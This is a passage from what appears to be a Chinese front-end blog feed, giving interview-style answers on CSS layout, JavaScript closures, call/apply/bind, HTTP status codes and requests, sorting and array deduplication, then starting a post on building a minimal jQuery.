允许用户的最大缩放值为1.0</span><br><span class="line">minimum-scale=1.0: 允许用户的最小缩放值为1.0</span><br><span class="line">2.媒体查询</span><br><span class="line"></span><br><span class="line">@media （）and（）&#123;&#125;</span><br><span class="line">//满足（）里的条件，就执行大括号里css的样式</span><br><span class="line">&lt;style&gt;</span><br><span class="line">@media (max-width:320px)&#123;</span><br><span class="line">    body&#123;</span><br><span class="line">        background: red;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">当最大宽度分辨率满足，就生效这个红色背景的CSS样式</span><br><span class="line">3.动态 rem 方案</span><br><span class="line">1rem等于根元素html的font-size的值，那么可以调整根元素的font-size值来调整页面缩放后的各个元素的尺寸和定位。</span><br><span class="line"></span><br><span class="line">在script标签加入这段代码：</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">   var pageWidth=window.innerWidth  //获取屏幕宽度</span><br><span class="line">   document.documentElement.style.fontSize= `$&#123;pageWidth/60&#125;px`</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">此处，fontSizede的值为屏幕宽的十分之一，那么在写CSS的时候可以这样写：</span><br><span class="line"></span><br><span class="line">.xxx&#123;</span><br><span class="line">    width:0.4rem;</span><br><span class="line">    height:0.2rem;</span><br><span class="line">    margin:0.05rem 0.05rem;</span><br><span class="line">    float:left;</span><br><span class="line"> &#125;</span><br><span class="line">用sass将px转化为rem：</span><br><span class="line"></span><br><span class="line">@function px( $px )&#123;</span><br><span class="line">  @return $px/$designWidth*10 + rem;</span><br><span class="line">&#125;</span><br><span class="line">$designWidth: 320px; </span><br><span class="line"></span><br><span class="line">那么1rem=32px</span><br></pre></td></tr></table></figure><h1 id="用过CSS3吗-实现圆角矩形和阴影怎么做"><a href="#用过CSS3吗-实现圆角矩形和阴影怎么做" class="headerlink" title="用过CSS3吗? 实现圆角矩形和阴影怎么做?"></a>用过CSS3吗? 实现圆角矩形和阴影怎么做?</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">用过CSS3。</span><br><span class="line">1.实现圆角</span><br><span class="line">实现圆角矩形</span><br><span class="line">使用 border-radius 属性：</span><br><span class="line"></span><br><span class="line">border-radius: 6px;</span><br><span class="line">当使用一个半径时确定一个圆形；当使用两个半径时确定一个椭圆，这个(椭)圆与边框的交集形成圆角效果。</span><br><span class="line">取值：</span><br><span class="line"></span><br><span class="line">用 px 等 css 长度单位值来定义圆形半径或椭圆的半长轴，半短轴。不能用负值。</span><br><span class="line">使用百分数定义圆形半径或椭圆的半长轴，半短轴。水平半轴相对于盒模型的宽度；垂直半轴相对于盒模型的高度。不能用负值。</span><br><span class="line">border-radius 属性又可以细分为以下 4 个属性，从左上角开始，逆时针依次为：</span><br><span class="line"></span><br><span class="line">border-top-left-radius</span><br><span class="line">border-top-right-radius</span><br><span class="line">border-bottom-right-radius</span><br><span class="line">border-bottom-left-radius</span><br><span class="line">因此，可以为四个角各自单独设置，也可以用简写的 border-radius 属性一起设置。</span><br><span class="line"></span><br><span class="line">border-radius: 6px;</span><br><span class="line"></span><br><span class="line">/* 相当于 */</span><br><span class="line"></span><br><span class="line">border-top-left-radius: 6px;</span><br><span class="line">border-top-right-radius: 6px;</span><br><span class="line">border-bottom-right-radius: 6px;</span><br><span class="line">border-bottom-left-radius: 6px;</span><br><span class="line">和其他简写属性类似，无法为个别值设定为继承，如 border-radius:0 0 inherit inherit，这会覆盖一部分现有定义。在这种情况下只能使用完整属性来指定。</span><br><span class="line">2.阴影</span><br><span class="line">有两种属性可以先实现阴影：</span><br><span class="line"></span><br><span class="line">box-shadow 属性和 text-shadow 属性</span><br><span class="line"></span><br><span class="line">使用 box-shadow 属性：</span><br><span class="line">box-shadow: inset 2px 2px 2px 1px red;</span><br><span class="line">会生成一个在边框内，水平、竖直偏移量均为 2px，模糊半径为 2px，同时阴影会扩大 1px 的红色阴影。</span><br><span class="line">box-shadow使用一个或多个投影，如果使用多个投影时必须需要用逗号“，”分开。</span><br><span class="line">对象选择器 &#123;box-shadow:inset x-offset y-offset blur-radius spread-radius color&#125;</span><br><span class="line">对象选择器 &#123;box-shadow:投影方式 X轴偏移量 Y轴偏移量 阴影模糊半径 阴影扩展半径 阴影颜色&#125;</span><br><span class="line">为文字添加阴影可以用 text-shadow 属性：</span><br><span class="line">text-shadow: 2px 2px 2px red;</span><br><span class="line">会生成一个水平、竖直偏移量均为 2px，模糊半径为 2px 的红色阴影。</span><br><span class="line">两个属性都可以有多组阴影值，多组阴影值之间用逗号相隔；多个阴影时会从前往后叠加，第一个阴影在最上面。</span><br></pre></td></tr></table></figure><h1 id="什么是闭包，闭包的用途是什么？"><a href="#什么是闭包，闭包的用途是什么？" class="headerlink" title="什么是闭包，闭包的用途是什么？"></a>什么是闭包，闭包的用途是什么？</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.什么是闭包？</span><br><span class="line"></span><br><span class="line">function f1()&#123;</span><br><span class="line">    var n=999;</span><br><span class="line">    function f2()&#123;</span><br><span class="line">　      alert(n); </span><br><span class="line">　　　　&#125;</span><br><span class="line">　　　　return f2;</span><br><span class="line">　　&#125;</span><br><span class="line">上面代码中的f2函数，就是闭包。</span><br><span class="line"></span><br><span class="line">闭包就是能够读取其他函数内部变量的函数。</span><br><span class="line"></span><br><span class="line">由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成&quot;定义在一个函数内部的函数&quot;。</span><br><span class="line"></span><br><span class="line">所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</span><br><span class="line">2.闭包的用途是什么？</span><br><span class="line">用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。</span><br><span class="line"></span><br><span class="line">function f1() &#123;</span><br><span class="line"></span><br><span class="line">  var n = 999;</span><br><span class="line"></span><br><span class="line">  nAdd = function () &#123;</span><br><span class="line">    n += 1</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function f2() &#123;</span><br><span class="line">    alert(n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return f2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var result = f1();</span><br><span class="line"></span><br><span class="line">result(); // 999</span><br><span class="line"></span><br><span class="line">nAdd();</span><br><span class="line"></span><br><span class="line">result(); // 1000</span><br><span class="line">在这段代码中，result实际上就是闭包f2函数。它一共运行了两次，第一次的值是999，第二次的值是1000。这证明了，函数f1中的局部变量n一直保存在内存中，并没有在f1调用后被自动清除。</span><br><span class="line"></span><br><span class="line">为什么会这样呢？原因就在于f1是f2的父函数，而f2被赋给了一个全局变量，这导致f2始终在内存中，而f2的存在依赖于f1，因此f1也始终在内存中，不会在调用结束后，被垃圾回收机制（garbage collection）回收。</span><br></pre></td></tr></table></figure><h1 id="call、apply、bind-的用法分别是什么？"><a href="#call、apply、bind-的用法分别是什么？" class="headerlink" title="call、apply、bind 的用法分别是什么？"></a>call、apply、bind 的用法分别是什么？</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apply()、call()和bind()方法都是Function.prototype对象中的方法，而所有的函数都是Function的实例。三者都可以改变this的指向，将函数绑定到上下文中。</span><br><span class="line">apply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数。 语法 func.apply(thisArg, [argsArray])</span><br><span class="line">call() 方法调用一个函数, 其具有一个指定的this值和分别地提供的参数(参数的列表)。 语法 fun.call(thisArg, arg1, arg2, ...)</span><br><span class="line">bind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。 语法 fun.bind(thisArg, 队列or数组)()</span><br><span class="line">这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中this的指向。</span><br><span class="line">function add(a,b)&#123;</span><br><span class="line">  return a+b;</span><br><span class="line">&#125;</span><br><span class="line">add.call(add, 5, 3); //8</span><br><span class="line">add.apply(add, [5, 3]); //8</span><br><span class="line">bind：bind 接受的参数跟 call 一致，只是 bind 不会立即调用，它会生成一个新的函数，你想什么时候调就什么时候调。如下代码：</span><br><span class="line">function add(a, b)&#123;</span><br><span class="line">  return a+b;</span><br><span class="line">&#125;</span><br><span class="line">var foo1 = add.bind(add, 5,3); </span><br><span class="line">foo1(); //8</span><br><span class="line">var foo1 = add.bind(add, 5,3); </span><br><span class="line">foo1(); //8</span><br></pre></td></tr></table></figure><h1 id="请说出至少-8-个-HTTP-状态码，并描述各状态码的意义。"><a href="#请说出至少-8-个-HTTP-状态码，并描述各状态码的意义。" class="headerlink" title="请说出至少 8 个 HTTP 状态码，并描述各状态码的意义。"></a>请说出至少 8 个 HTTP 状态码，并描述各状态码的意义。</h1><p>例如：</p><p>状态码 200 表示响应成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">1xx(临时响应)表示临时响应并需要请求者继续执行操作的状态代码。</span><br><span class="line">100 (继续) 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。</span><br><span class="line"></span><br><span class="line">101 (切换协议) 请求者已要求服务器切换协议，服务器已确认并准备切换。</span><br><span class="line"></span><br><span class="line">2xx (成功)表示成功处理了请求的状态代码。</span><br><span class="line">200 (成功) 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。</span><br><span class="line"></span><br><span class="line">201 (已创建) 请求成功并且服务器创建了新的资源。</span><br><span class="line"></span><br><span class="line">202 (已接受) 服务器已接受请求，但尚未处理。</span><br><span class="line"></span><br><span class="line">203 (非授权信息) 服务器已成功处理了请求，但返回的信息可能来自另一来源。</span><br><span class="line"></span><br><span class="line">204 (无内容) 服务器成功处理了请求，但没有返回任何内容。</span><br><span class="line"></span><br><span class="line">205 (重置内容) 服务器成功处理了请求，但没有返回任何内容。</span><br><span class="line"></span><br><span class="line">206 (部分内容) 服务器成功处理了部分 GET 请求。</span><br><span class="line"></span><br><span class="line">3xx (重定向) 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</span><br><span class="line">300 (多种选择) 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</span><br><span class="line"></span><br><span class="line">301 (永久移动) 请求的网页已永久移动到新位置。 服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</span><br><span class="line"></span><br><span class="line">302 (临时移动) 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span><br><span class="line"></span><br><span class="line">303 (查看其他位置) 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</span><br><span class="line"></span><br><span class="line">304 (未修改) 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</span><br><span class="line"></span><br><span class="line">305 (使用代理) 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。</span><br><span class="line"></span><br><span class="line">307 (临时重定向) 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span><br><span class="line"></span><br><span class="line">4xx(请求错误) 这些状态代码表示请求可能出错，妨碍了服务器的处理。</span><br><span class="line">400 (错误请求) 服务器不理解请求的语法。</span><br><span class="line"></span><br><span class="line">401 (未授权) 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。</span><br><span class="line"></span><br><span class="line">403 (禁止) 服务器拒绝请求。</span><br><span class="line"></span><br><span class="line">404 (未找到) 服务器找不到请求的网页。</span><br><span class="line"></span><br><span class="line">405 (方法禁用) 禁用请求中指定的方法。</span><br><span class="line"></span><br><span class="line">406 (不接受) 无法使用请求的内容特性响应请求的网页。</span><br><span class="line"></span><br><span class="line">407 (需要代理授权) 此状态代码与 401(未授权)类似，但指定请求者应当授权使用代理。</span><br><span class="line"></span><br><span class="line">408 (请求超时) 服务器等候请求时发生超时。</span><br><span class="line"></span><br><span class="line">409 (冲突) 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</span><br><span class="line"></span><br><span class="line">410 (已删除) 如果请求的资源已永久删除，服务器就会返回此响应。</span><br><span class="line"></span><br><span class="line">411 (需要有效长度) 服务器不接受不含有效内容长度标头字段的请求。</span><br><span class="line"></span><br><span class="line">412 (未满足前提条件) 服务器未满足请求者在请求中设置的其中一个前提条件。</span><br><span class="line"></span><br><span class="line">413 (请求实体过大) 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</span><br><span class="line"></span><br><span class="line">414 (请求的 URI 过长) 请求的 URI(通常为网址)过长，服务器无法处理。</span><br><span class="line"></span><br><span class="line">415 (不支持的媒体类型) 请求的格式不受请求页面的支持。</span><br><span class="line"></span><br><span class="line">416 (请求范围不符合要求) 如果页面无法提供请求的范围，则服务器会返回此状态代码。</span><br><span class="line"></span><br><span class="line">417 (未满足期望值) 服务器未满足&quot;期望&quot;请求标头字段的要求。</span><br><span class="line"></span><br><span class="line">5xx(服务器错误)这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</span><br><span class="line">500 (服务器内部错误) 服务器遇到错误，无法完成请求。</span><br><span class="line"></span><br><span class="line">501 (尚未实施) 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。</span><br><span class="line"></span><br><span class="line">502 (错误网关) 服务器作为网关或代理，从上游服务器收到无效响应。</span><br><span class="line"></span><br><span class="line">503 (服务不可用) 服务器目前无法使用(由于超载或停机维护)。 通常，这只是暂时状态。</span><br><span class="line"></span><br><span class="line">504 (网关超时) 服务器作为网关或代理，但是没有及时从上游服务器收到请求。</span><br><span class="line"></span><br><span class="line">505 (HTTP 版本不受支持) 服务器不支持请求中所用的 HTTP 协议版本。</span><br></pre></td></tr></table></figure><h1 id="请写出一个-HTTP-post-请求的内容，包括四部分。"><a href="#请写出一个-HTTP-post-请求的内容，包括四部分。" class="headerlink" title="请写出一个 HTTP post 请求的内容，包括四部分。"></a>请写出一个 HTTP post 请求的内容，包括四部分。</h1><p>其中<br>第四部分的内容是 username&#x3D;ff&amp;password&#x3D;123</p><p>第二部分必须含有 Content-Type 字段</p><p>请求的路径为 &#x2F;path</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 POST /path HTTP/1.1</span><br><span class="line">2 Host: www.demo.com</span><br><span class="line">2 Cache-Control: no-cache</span><br><span class="line">2 Postman-Token: 81d7b315-d4be-8ee8-1237-04f3976de032</span><br><span class="line">2 Content-Type: application/x-www-form-urlencoded</span><br><span class="line">3 </span><br><span class="line">4 username=ff&amp;password=123</span><br></pre></td></tr></table></figure><h1 id="请说出至少三种排序的思路，这三种排序的时间复杂度分别为"><a href="#请说出至少三种排序的思路，这三种排序的时间复杂度分别为" class="headerlink" title="请说出至少三种排序的思路，这三种排序的时间复杂度分别为"></a>请说出至少三种排序的思路，这三种排序的时间复杂度分别为</h1><p>O(n*n)</p><p>O(n log2 n)</p><p>O(n + max)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.O(n*n)冒泡排序（升序）</span><br><span class="line">选择第1个和第2个数字，如果第1个&gt;第2个则二者交换位置，之后选择第2个和第3个数字，类似交换处理，一轮下来后，最大的数字会冒泡到最后一位。接下来，忽略已经排好的数字，对剩下的数字进行新一轮排序，直到所有数字都排序完成。</span><br><span class="line">2.O(n log2 n)快速排序</span><br><span class="line">从数列中挑出一个元素称为基准；</span><br><span class="line">重新排序数列，所有比基准值小的元素放在基准前面，所有比基准值大的元素放在基准后面(相等的数可以放在任一边)；</span><br><span class="line">递归的把小于基准值的子数列和大于基准值的子数列排序；</span><br><span class="line">递归到最底部时，数列的大小是零或一，也就是已经排序好了。</span><br><span class="line">3.O(n + max)基数排序</span><br><span class="line">将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后，数列就变成一个有序序列。</span><br></pre></td></tr></table></figure><h1 id="一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？"><a href="#一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？" class="headerlink" title="一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？"></a>一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</h1><p>这一题是在挖掘你的知识边界，所以你知道多少就要答多少。</p><p>可以先查阅一些资料再查，但是不要把自己不懂的东西放在答案里，面试官会追问的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.DNS解析</span><br><span class="line">DNS解析的过程就是寻找哪台机器上有你需要资源的过程。当你在浏览器中输入一个地址时，例如www.baidu.com，其实不是百度网站真正意义上的地址。互联网上每一台计算机的唯一标识是它的IP地址，但是IP地址并不方便记忆。用户更喜欢用方便记忆的网址去寻找互联网上的其它计算机，也就是上面提到的百度的网址。所以互联网设计者需要在用户的方便性与可用性方面做一个权衡，这个权衡就是一个网址到IP地址的转换，这个过程就是DNS解析。</span><br><span class="line"></span><br><span class="line">2.TCP连接</span><br><span class="line">每次建立连接前，客户端和服务端之前都要先进行三次对话才开始正式传输内容，三次对话大概是这样的：</span><br><span class="line"></span><br><span class="line"> 1. 客户端：我要连接你了，可以吗</span><br><span class="line"> 2. 服务端：嗯，我准备好了，连接我吧</span><br><span class="line"> 3. 客户端：那我连接你咯。</span><br><span class="line"> 4. 开始后面步骤</span><br><span class="line">3.发送HTTP请求</span><br><span class="line">其实这部分又可以称为前端工程师眼中的HTTP，它主要发生在客户端。发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。</span><br><span class="line"></span><br><span class="line">1 动词 路径 协议/版本</span><br><span class="line">2 Key1: value1</span><br><span class="line">2 Key2: value2</span><br><span class="line">2 Key3: value3</span><br><span class="line">2 Content-Type: application/x-www-form-urlencoded</span><br><span class="line">2 Host: www.baidu.com</span><br><span class="line">2 User-Agent: curl/7.54.0</span><br><span class="line">3 </span><br><span class="line">4 要上传的数据</span><br><span class="line">4.服务器处理请求并返回HTTP报文</span><br><span class="line">HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。</span><br><span class="line">状态码</span><br><span class="line">状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值:</span><br><span class="line"></span><br><span class="line">1xx：指示信息–表示请求已接收，继续处理。</span><br><span class="line"></span><br><span class="line">2xx：成功–表示请求已被成功接收、理解、接受。</span><br><span class="line"></span><br><span class="line">3xx：重定向–要完成请求必须进行更进一步的操作。</span><br><span class="line"></span><br><span class="line">4xx：客户端错误–请求有语法错误或请求无法实现。</span><br><span class="line"></span><br><span class="line">5xx：服务器端错误–服务器未能实现合法的请求。</span><br><span class="line">平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500</span><br><span class="line"></span><br><span class="line">5.浏览器解析渲染页面</span><br><span class="line">浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上</span><br><span class="line"></span><br><span class="line">6.连接结束</span><br><span class="line">通过四次挥手关闭连接。一端断开连接需要两次挥手（请求和回应），两端断开连接就需要四次挥手。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="如何实现数组去重？"><a href="#如何实现数组去重？" class="headerlink" title="如何实现数组去重？"></a>如何实现数组去重？</h1><p>假设有数组 array &#x3D; [1,5,2,3,4,2,3,1,3,4]</p><p>你要写一个函数 unique，使得<br>unique(array) 的值为 [1,5,2,3,4]<br>也就是把重复的值都去掉，只保留不重复的值。</p><p>要求：</p><p>不要做多重循环，只能遍历一次<br>请给出两种方案，一种能在 ES 5 环境中运行，一种能在 ES 6 环境中运行（提示 ES 6 环境多了一个 Set 对象）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ES 5</span><br><span class="line">ES5 提供了 filter 方法，我们可以用来简化外层循环：</span><br><span class="line">比如使用 indexOf 的方法：</span><br><span class="line"></span><br><span class="line">function unique(array) &#123;</span><br><span class="line">    var res = array.filter(function(item, index, array)&#123;</span><br><span class="line">        return array.indexOf(item) === index;</span><br><span class="line">    &#125;)</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line">console.log(unique(array));</span><br><span class="line">排序去重的方法：</span><br><span class="line"></span><br><span class="line">function unique(array) &#123;</span><br><span class="line">    return array.concat().sort().filter(function(item, index, array)&#123;</span><br><span class="line">        return !index || item !== array[index - 1]</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">console.log(unique(array));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ES 6</span><br><span class="line"></span><br><span class="line">function unique(array) &#123;</span><br><span class="line">    return [...new Set(array)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自己写一个简版jQuery</title>
      <link href="/posts/f816e53f/"/>
      <url>/posts/f816e53f/</url>
      
        <content type="html"><![CDATA[<p>为了便于学习与理解jQuery，自己尝试去写一个只有两个API的简版jQuery。</p><h1 id="什么是JQuery"><a href="#什么是JQuery" class="headerlink" title="什么是JQuery"></a>什么是JQuery</h1><p>jQuery是js的一个工具库，由John Resig在2006年发布。</p><p>j代表JavaScript，query是“查询”的意思。也就是说，这个库的意图是基于JavaScript的查询。</p><p>查询的目标是什么？</p><p>答案是DOM（文档对象模型）结构中的Node（节点）。一个网页就是一个html文档，而网页上的所有内容都是节点，包括文档节点、元素节点、文本节点、注释节点、属性节点等等。而jQuery的查询最主要针对的是元素节点，如段落（p）、锚点（a）、表格（table）等，只有少数方法可以处理文本节点与注释节点。同时jQuery还可以用attr方法方便地对元素节点的属性进行读取&#x2F;设置。</p><p><strong>jQuery的核心是通过各种选择器，选中DOM元素</strong></p><h1 id="节点或者选择器判断"><a href="#节点或者选择器判断" class="headerlink" title="节点或者选择器判断"></a>节点或者选择器判断</h1><p>由于jQuery支持传参字符串，所以先判断参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">window.jQuery = function(nodeOrSelector) &#123;</span><br><span class="line">  let nodes = &#123;&#125;</span><br><span class="line">  if (typeof nodeOrSelector === &#x27;string&#x27;) &#123;</span><br><span class="line">    let temp = document.querySelectorAll(nodeOrSelector)</span><br><span class="line">    for (let i = 0; i &lt; temp.length; i++) &#123;</span><br><span class="line">      nodes[i] = temp[i]</span><br><span class="line">    &#125;</span><br><span class="line">    nodes.length = temp.length</span><br><span class="line">  &#125; else if (nodeOrSelector instanceof Node) &#123;</span><br><span class="line">    nodes = &#123;</span><br><span class="line">      0: nodeOrSelector,</span><br><span class="line">      length: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    return nodes</span><br><span 